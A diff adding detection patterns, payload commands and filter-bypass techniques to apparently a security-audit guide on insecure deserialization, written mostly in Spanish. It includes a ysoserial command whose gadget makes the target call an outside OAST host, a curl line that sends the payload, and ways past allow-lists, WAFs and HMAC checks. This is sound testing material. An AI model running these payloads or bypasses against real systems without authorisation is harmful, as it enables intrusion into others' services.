@@ -122,6 +122,58 @@ chains_with: [rce, info-disclosure, auth-bypass]
   serialized-object patterns in traffic plus semi-automated gadget probing.
 - `xxd`/`base64` — manual byte-level inspection, the first and cheapest step every time.
 
+## Payloads & Detection Patterns
+
+Guía de caza: una familia por formato nativo de serialización. La identificación del formato es
+solo "format identified"; el salto a Demonstrated exige un side effect observable (canary DNS/HTTP,
+sleep, archivo escrito) atribuible a la deserialización, y la ejecución plena es un gate aparte.
+
+| Categoría | Shape | Propósito |
+|---|---|---|
+| Java magic bytes | `0xAC 0xED 0x00 0x05` (`rO0AB...` en base64) | Detectar `ObjectInputStream` en cookie/param/body |
+| PHP serialize | `O:N:"Class":M:{...}`, `a:N:{...}`, `s:N:"..."` | Objeto/array `unserialize()` controlado |
+| Python pickle | opcode `\x80` (proto 2+), `(dp0`/`c__main__` (proto 0) | Sink `pickle.loads()` |
+| .NET BinaryFormatter/ViewState | `__VIEWSTATE` con prefijo `/wEP...` sin MAC, blob base64 | ViewState forjable / `BinaryFormatter.Deserialize` |
+| Ruby Marshal | par de bytes de versión `\x04\x08` | Sink `Marshal.load` |
+| Gadget chain (Java) | `ysoserial` payload version-matched (CommonsCollections, etc.) | Instanciación de objeto peligroso |
+| Gadget chain (PHP) | `phpggc` chain para la clase de gadget presente | Object-injection a side effect |
+| Canary no-destructivo | gadget que dispara `nslookup TOKEN.oast.site` o sleep | Separar "construye objeto" de "tiene side effect" |
+
+Surface signals que delatan la clase antes de inyectar:
+- Valores base64/binarios en cookies, hidden fields o bodies que decodifican a un magic byte de la tabla.
+- Fingerprint de `tech-stack-fingerprint` con librería vulnerable conocida (Commons Collections viejo, Jackson/Fastjson con tipado polimórfico, ViewState sin `EnableViewStateMac`).
+- Errores en input malformado mencionando `readObject`, `ClassNotFoundException`, `unserialize(): Error at offset`, `pickle.UnpicklingError` → confirman el sink antes de cualquier chain.
+- Capas de cache/sesión (Redis, Memcached, session files) que guardan objetos serializados, alcanzables vía otra vuln (SSRF/LFI).
+
+```bash
+# identificación de formato por magic bytes (paso más barato, siempre primero)
+echo "$VALUE" | base64 -d | xxd | head -5
+# ac ed 00 05 = Java | 04 08 = Ruby | 80 04/05 = pickle | O:/a:/s: = PHP (texto plano)
+```
+
+```bash
+# side-effect probe no-destructivo con canary OAST (requiere gate explícito del operador)
+python3 -m engine.oast token --audit-dir . --purpose deser-canary --vuln-class deserialization \
+  --target-url https://target/endpoint --parameter session   # -> dominio con token
+ysoserial -p "$MatchedPayload" -c "nslookup TOKEN.DOMAIN.oast.site" > payload.ser
+curl -s -i https://target/endpoint --data-binary @payload.ser
+python3 -m engine.oast poll --audit-dir .                      # hit correlacionado = Demonstrated
+```
+
+## Bypass Techniques
+
+Agrupadas por la defensa que evaden; probar la familia completa antes de declarar sink seguro.
+Sin output directo, la confirmación ciega es solo por callback correlacionado por token en el gate OOB.
+
+| Filtro evadido | Técnica | Notas |
+|---|---|---|
+| `ObjectInputFilter`/allow-list (JVM) | Gadget cuya clase esté dentro del allow-list, o chain que no requiera clases bloqueadas | Verificar que el filtro es real, no solo presente en config |
+| WAF por firma de gadget conocido | Ofuscar/recomprimir el payload, chain alterno para la misma librería | Request bloqueado ≠ sink inexistente |
+| ViewState MAC | Solo viable si `EnableViewStateMac`+encryption efectivamente off | MAC fallando es integridad funcionando, finding más débil |
+| PHP `__wakeup`/`__destruct` hardening | Chain que no dependa de esos magic methods, gadget alterno de `phpggc` | Depende de las clases en el classpath/autoload |
+| Brittleness entre versiones | Reemplazar la chain por una exacta de la versión detectada | Chain de 3.1 fallando en 3.2.1 es esperado, no prueba de seguridad |
+| Firma HMAC sobre el blob | Buscar la clave (weak secret, leak) para re-firmar el estado manipulado | Si el HMAC se verifica antes de deserializar, el sink no se alcanza |
+
 ## Root Causes
 
 - Server-side code calling a native deserialization API (`ObjectInputStream.readObject`,
